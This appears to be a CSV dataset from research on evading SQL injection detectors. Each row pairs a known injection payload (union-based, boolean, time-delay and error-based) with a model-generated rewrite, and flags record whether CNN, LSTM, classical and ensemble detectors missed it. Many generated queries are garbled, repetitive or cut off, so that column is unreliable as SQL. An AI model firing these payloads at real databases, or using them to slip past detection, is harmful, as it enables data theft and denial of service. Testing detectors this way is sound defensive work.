original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",SELECT * FROM * FROM users WHERE NOT id = '1' OR. = 1,1,1,1,0,1,1,0
"' union (select NULL, NULL, NULL,  (select @@version)) --",SELECT MIN(select) FROM SQL injection_detect WHERE NOT select @@version) = 'evade sq injection detection',0,0,1,1,1,1,1
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 'Y',1,0,0,0,1,0,0
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,SELECT MIN(sql injection) FROM SQL injection detection WHERE NOT SELECT DISTINCT 'evade sq injection' AND 7533 = 7533 AND ( ( ( (SELECT MIN(sql injection) FROM SQL injection),1,1,0,0,0,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
"-6775"" union all select 7484,7484#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT 7484,7484# FROM Query: -6775 union All select 7484,7484# FROM SQL_Injection",1,1,1,0,0,0,0
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",SELECT MIN(.) FROM SQL injection_detective WHERE NOT id = '1' union select (. ),1,0,0,0,1,0,0
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1,1,1,1,0,0,0,0
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injections WHERE id = 1 + ( 1 ) OR 1 = 1,1,1,0,0,0,0,0
1  )   and 7533  =  7533 and   (  7175  =  7175,SELECT * FROM SQL AS t1 JOIN 1 query: 1 JOIN 7533 = 7533 AND 7175 = 7175,0,1,1,0,0,0,0
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--","SELECT 4820,4820,4820,4820,4820,4820-- for FROM SQL injections WHERE NOT i_express injection detection ='sq injection'",1,1,1,0,0,0,0
select case when 6420  =  7941 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 6420 = 7941 AND NOT SELECT SELECT MIN(1 = 0,1,1,1,0,0,0,0
"-9082 union all select 9858,9858,9858,9858,9858,9858--","SELECT MIN(9858,9858,9858,9858,9858-- FROM SQL SELECT MIN(sql injection) FROM Query: -9082 union All select 9858,9858,9858,9858,9858-- FROM SQL_Injection WHERE NOT -9058 = 'did'",1,1,0,0,0,0,0
1'   )    )    as dqby where 9256  =  9256,SELECT dqby FROM SQL injection detection WHERE 9256 = 9256,1,0,1,1,1,1,1
1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,SELECT MIN(sql injection) FROM SQL SELECT'ssl injection detection' FROM query: 1'+ WHERE 6853 = 6853 rlike sleep ( 5 ),1,1,0,0,0,0,0
select case when 3661  =  9315 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL JOIN detection FROM SQL Query: SELECT MIN(3661 = 9315 AND NOT SELECT MIN(1 = 1 AND NOT SELECT MIN(1 = 1,0,1,1,0,1,1,0
1%' waitfor delay '0:0:5' and '%'  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT % = '%' FROM SQL,1,0,0,0,1,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
1   )    )    as jvvs where 9594  =  9594,SELECT MIN(1 ) FROM jvvs WHERE NOT SQL_injection = 9594,1,1,1,0,1,1,0
"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE 3738 = 3738 OR 3738 = 3738 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--","SELECT MIN(300,3004,3004,3004-- FROM SQL SELECT MIN(3004,3004--) FROM SQL SELECT DISTINCT SUM(300,3004,3004--) FROM SQL JOIN 3004,3004,3004--",1,1,1,1,0,1,0
"1   )    )    as sxhg where 7697  =  7697 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_injection FROM SQL WHERE 7697 = 7697 OR char ( 117 ) ||char ( 105 ) ORDER BY crypt_injection),1,1,0,0,0,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi","SELECT MIN(sql ing) FROM SQL injection - SELECT MIN(sql ing) FROM SQL - SELECT - (SELECT - FROM SELECT - FROM SQL - ON - ON - ON - ON - ON - STRFTIME('%y', - FROM -SELECT - FROM SQL - ON - ON - if (SELECT - FROM SELECT - FROM SQL,'sq injection','sql'sql') FROM SQL elumination) FROM SELECT &//,SELECT, FROM SQL -'sql ing' FROM SELECT - (SELECT - FROM SQL - ON t1.char ( char ( 5389 ) FROM SELECT - FROM SQL SELECT - FROM SQL - ON - ON - ON - ON - ON - (SELECT - FROM SELECT - FROM SQL -'sql'sql'sq",1,1,0,1,0,0,0
1 where 1931  =  1931 and sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE ""unknown SQL injection"" = ""valid"" AND sleep ( 5 )""",0,1,0,0,0,0,0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl","SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM SQL injection",1,0,1,1,1,1,1
"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT STRFTIME('%y', -1401) = '3480,3480'",1,1,0,0,1,0,0
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM SQL Query: 1 ORDER BY MIN(sql injection),1,1,1,1,1,1,1
"1   )    )     )   union all select null,null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql",1,1,1,0,1,1,0
1%'  )   and 8734  =  5844,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT 8734 = 5844,1,1,1,1,1,1,1
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT MIN(sql) FROM SQL - SELECT gwxc FROM ""SQL - 3626 = 3626"" AND char( 107 ) ||char ( 77 )",1,1,0,0,0,0,0
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR SQL_injection = ""$ union select 1,@@VERSION -- 1""",1,1,1,0,0,0,0
1  )   and   (  3020  =  3020  )  *6703,"SELECT *6703 FROM SQL query: 1 - MIN(3020 = 3020) *6703 FROM SQL AS injection_engine = ""valid""",1,1,0,0,1,0,0
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL,1,1,1,1,1,1,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,SELECT 6969 FROM pg_sleep ( 5 ) and 6969 = 'zoin',1,1,0,0,0,0,0
"1'   )    )    union all select null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql - Deleted FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql,null,null,null,null,null,null,null,null,null,null FROM SQL SELECT MIN(sql-- Deleted FROM SQL injection) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN",1,1,1,0,0,0,0
') waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT Query: '0:0:20',1,0,1,1,1,1,1
"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000, md5 ( 0x544d5a4c ) FROM SQL injection AS t1 JOIN 7080 = 7080 OR 7080 = 7080 OR 7014 = benchmark (5000000,md5 ( 5000000, md5 ( 0x544d5a4c )",1,1,0,0,0,0,0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#","SELECT MIN(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"1"" order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT jgoq, jgoq FROM SQL JOIN detection'",0,1,0,0,1,0,0
"1"" and 6637  =  2321",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23","SELECT MIN(sql injection) FROM SQL JOIN 1,2,3,4,5,7,9,0 FROM SQL JOIN detection of evade SQL injection detection",0,0,1,0,0,0,0
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1'+ WHERE 2655 = 2655 rlike (SELECT MIN(2118 = 8500) AND 1 = 2,1,1,0,0,0,0,0
; or '1'  =  '1',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: ; or '1' = '1',1,0,0,0,1,0,0
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1","SELECT MIN(sql injection) FROM SQL_injection WHERE Id = 1 Union select 1 A,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT MIN(selection_exchange) FROM SQL injection WHERE 2679 = 2679 AND 6414 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(CASE WHEN STRFTIME('%y','sq injection') = 2679 = 2679 AND NOT STRFTIME('%y-%m-%d', SUM(SELECT SUM(succ_resullations.short count ( * ) FROM rdb$functions as t3,rdb$functions FROM SQL))",0,1,0,0,1,0,0
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet","SELECT MIN(sequence) FROM SQL injection, SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL",1,1,1,1,1,1,1
)))))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1 where 4372  =  4372,SELECT * FROM query: 1 WHERE NOT SQL_injection = 4372,1,0,1,1,1,1,1
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM sysibm.systables as t3 JOIN sysibm.systables as t3 ON sysibm.systables = t2.sysibm.systables as t3 WHERE NOT SELECT - (SELECT MIN(*) FROM sysibm.systables as t3 FROM SELECT SELECT MIN(*) FROM sysibm.systables as t3 FROM SELECT SELECT MIN(*) FROM SQL SELECT MIN(*) FROM sysibm.systables as t3 FROM sysibm.systables as t3 FROM sysibm.sy",1,1,0,0,0,0,0
1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sql injection) FROM SQL_injection WHERE 9912 = 9912 AND 8594 = (SELECT MIN(succes) FROM pg_sleep WHERE NOT ucro = 9912 AND NOT ucro = 9912 AND NOT ucro = 'ucro',1,1,0,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
-9975 where 9760  =  9760 order by 1--,SELECT -9975 FROM SQL_Inject JOIN -9975 WHERE 9760 = 9760 ORDER BY 1-- SELECT generated FROM query: -9975 WHERE NOT SQL_inject ='sq injection',0,1,1,1,0,1,0
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--","SELECT MIN(7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689 = 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689-- as sxbn - sxbn - sxbn - sxbn, _______________________________________",1,0,1,0,0,0,0
"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE NOT SQL_injection = 'valid' AND NOT SELECT MIN(3267,3267,case) FROM create_series WHERE (3267 = 5900 ) = 1",0,1,0,0,0,0,0
' or 'something' like 'some%',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
select case when 5346  =  8272 then 1 else null end--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query WHERE 5346 = 8272 AND NOT SELECT MIN(1 else null end--),1,1,1,0,1,1,0
"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 4319 = 4319 AND NOT SELECT MIN(1,5000000) FROM generate_series WHERE NOT SELECT MIN(succes) FROM SQL injection detection",1,1,0,0,1,0,0
"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '","SELECT * FROM SQL SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 & % = 'evade SQL injection'",1,1,0,0,0,0,0
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL injection detection) FROM SQL SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL_injection) FROM SQL_injection",1,1,0,0,1,0,0
" select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",SELECT MIN( ) FROM SQL injection detection,1,0,1,1,1,1,1
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx","SELECT COUNT(*) FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys3,sysusers as sys4,sysusers as sys7  (SELECT ctdx FROM SELECT ctdx FROM SELECT ctdx FROM SELECT ctdx FROM 1 ORDER BY ctdx DESC LIMIT 1) AND NOT SELECT (SELECT SUM(*) FROM SQL Injection) FROM SELECT SELECT SELECT MIN(sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7  (SELECT ctdx FROM SELECT ctdx FROM SELECT ctdx FROM sysusers as sys1,sysusers as sys1,sysusers as sysusers AS sysuser",0,1,0,0,0,0,0
1'   )    )    as dckd where 1794  =  1794,SELECT dckd FROM SQL SELECT dckd WHERE 1794 = 1794,1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
23 or 1=1; --,SELECT NOT SQL_inject FROM query: 23 ORDER BY query: 1,1,0,1,1,1,1,1
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509","SELECT * FROM SQL injection, SELECT MIN(*) FROM SQL_injection) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT MIN(9509 = 9509) FROM SQL SELECT MIN(sysibm.systables) FROM sysibm.systables as t3 JOIN sysibm.systables as t2 ON sysibm.systables = ""sq injection detection""",1,1,0,0,0,0,0
"select sleep  (  5  )   and ""jvys"" like ""jvys","SELECT * FROM query: select sleep ( 5 ) AND NOT jvys = ""jvys""",1,1,0,0,1,0,0
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#","SELECT MIN(sql injection) FROM SQL - SELECT 6996,6996,6996,6996,6996,6996,6996# FROM SQL SELECT MIN(sql injection) FROM Query: -9860% union All select 6996,6996,6996,6996,6996,6996,6996# FROM SQL SELECT MIN(sql injection) FROM Query: -9860% union All select 6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,6996,69",1,1,0,0,0,0,0
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#","SELECT MIN(sql injection) FROM SQL -6595 - STRFTIME('%y', -6595 - ) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL",0,1,0,0,1,0,0
1 where 3956  =  3956,SELECT * FROM query: 1 WHERE NOT SQL_injection = 3956,1,0,1,1,1,1,1
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,SELECT MIN(sequence) FROM SQL injection AS t1 JOIN Query: (SELECT SUM(sequence) FROM SQL SELECT SUM(sequence) FROM SQL SELECT SUM(sequence) FROM query: (SELECT SUM(sequence) FROM SQL SELECT SUM(sequence) FROM query: (SELECT SUM(sequence) FROM query:) AS c1 FROM query: (SELECT SUM(sysdatabases ) FROM SQL JOIN Query: (SELECT AS t2 ON t1.sysdatabases ) AS t3 ON t1.sysdatabases ='master..sysdatabases )' FROM SQL injection),0,1,0,0,1,0,0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",SELECT MIN(qpuy) FROM SQL injection,1,0,1,1,1,1,1
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",SELECT MIN(5023 = ctxsys.drithsx.sn) FROM SQL injection,1,1,0,0,1,0,0
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,SELECT MIN(3020 = 3020) FROM SQL injection_detection WHERE NOT SELECT DISTINCT syst_injection_method = 'evade',1,0,0,1,1,1,0
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM SELECT SELECT MIN(*) FROM SQL JOIN Query: 1' ORDER BY sysibm.systables as t2,sysibm.systables as t3",1,1,0,0,0,0,0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf","SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection' FROM SQL SELECT 'abcdefg',upper ( hex ( randomblob ( 500000000000/2 )' AND (cogf) = 'cogf')",1,1,0,0,1,0,0
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 + $+* union select null,@@VERSION -- 1",1,1,1,0,1,1,0
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,SELECT MIN(sql injection) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM Query: 1' AND 7533 = 7533 AND 'jwgc = 'jwgc',1,1,0,0,1,0,0
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840","SELECT MIN(6185 = 6840) FROM SQL_set WHERE NOT 9354 = 9354 = 9354,7185 ) AND (((6840 = 6840) = 6840",1,1,0,0,0,0,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL injection - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 = 6902 AND 6902 = 6902 AND 6055 = ctxsys.drithsx.sn ( 6055) ||chr ( 113 ) FROM SQL injection detection),1,1,0,0,0,0,0
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",SELECT MIN(sequence) FROM SQL injection_description,1,0,1,1,1,1,1
"-8841%""  )   or 4361  =  1910",SELECT MIN(1999 = 1910) FROM SQL injection detection,1,0,1,1,1,1,1
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 1,1,0,0,0,1,0,0
"1%""  )   union all select null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1%,1,1,0,0,1,0,0
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8","SELECT MIN(2,3,4,5,6,8 FROM SQL injection detection",1,0,1,1,0,1,0
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,SELECT 6793 FROM pg_sleep WHERE NOT i_sex injection = (SELECT MIN(SQL) FROM SQL_injection),1,0,1,0,1,1,0
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri","SELECT MIN(5882 = 5919,5919) FROM SQL injection_description",1,0,0,0,1,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy","SELECT MIN(""hhzy"") FROM SQL injection detection",1,0,1,1,1,1,1
"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",SELECT MIN(sql injection) FROM SQL - 4870,1,0,1,1,1,1,1
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM SQL SELECT * FROM * FROM Users WHERE NOT SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM SQL AS SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM * FROM Users,1,0,1,1,1,1,1
